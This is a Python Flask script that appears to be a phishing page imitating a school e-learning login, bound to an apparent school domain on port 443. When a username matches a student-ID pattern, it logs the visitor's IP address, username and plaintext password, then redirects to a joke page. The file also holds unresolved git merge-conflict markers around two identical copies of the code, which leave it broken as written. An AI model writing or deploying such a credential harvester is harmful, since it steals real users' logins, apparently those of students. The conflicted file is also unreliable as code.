<<<<<<< HEAD
from flask import Flask, render_template, request
import logging
import re

app = Flask(__name__)
LOG_FORMAT = "[%(asctime)s] [%(levelname)s] > %(message)s"
logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)


@app.route("/")
def get_form():
    return render_template("index.html")


@app.route("/login", methods=["POST", "GET"])
def set_result():
    if request.method == "POST":
        addr = request.remote_addr
        username = request.form["username"]
        password = request.form["password"]
        if re.match(r'^e[0-9]{6}$', username):
            logging.info(f"IP addr:{addr}")
            logging.info(f"username:{username}")
            logging.info(f"password:{password}")
            del username, password, addr # del userdata
            return render_template("rickroll.html")
        else:
            render_template("login.html")
    else:
        return render_template("login.html")
    return render_template("login.html")


if __name__ == "__main__":
=======
from flask import Flask, render_template, request
import logging
import re

app = Flask(__name__)
LOG_FORMAT = "[%(asctime)s] [%(levelname)s] > %(message)s"
logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)


@app.route("/")
def get_form():
    return render_template("index.html")


@app.route("/login", methods=["POST", "GET"])
def set_result():
    if request.method == "POST":
        addr = request.remote_addr
        username = request.form["username"]
        password = request.form["password"]
        if re.match(r'^e[0-9]{6}$', username):
            logging.info(f"IP addr:{addr}")
            logging.info(f"username:{username}")
            logging.info(f"password:{password}")
            del username, password, addr # del userdata
            return render_template("rickroll.html")
        else:
            render_template("login.html")
    else:
        return render_template("login.html")
    return render_template("login.html")


if __name__ == "__main__":
>>>>>>> 7ea96f703abd6a5b8e3575f1309ccee024c8c8ee
    app.run(debug=True, host="ilearn.fkyc.edu.hk", port=443)